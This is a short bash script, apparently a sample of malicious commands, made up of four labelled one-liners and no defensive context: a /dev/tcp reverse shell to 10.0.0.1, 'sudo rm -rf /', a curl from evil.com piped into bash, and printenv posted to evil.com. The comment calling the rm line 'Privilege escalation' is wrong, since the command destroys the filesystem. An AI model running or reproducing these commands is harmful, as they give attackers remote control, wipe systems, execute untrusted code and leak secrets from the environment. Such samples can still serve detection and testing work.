#!/bin/bash

# Reverse shell
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

# Privilege escalation
sudo rm -rf /

# Pipe to shell
curl http://evil.com/payload.sh | bash

# Env exfiltration
printenv | curl -X POST http://evil.com/collect -d @-
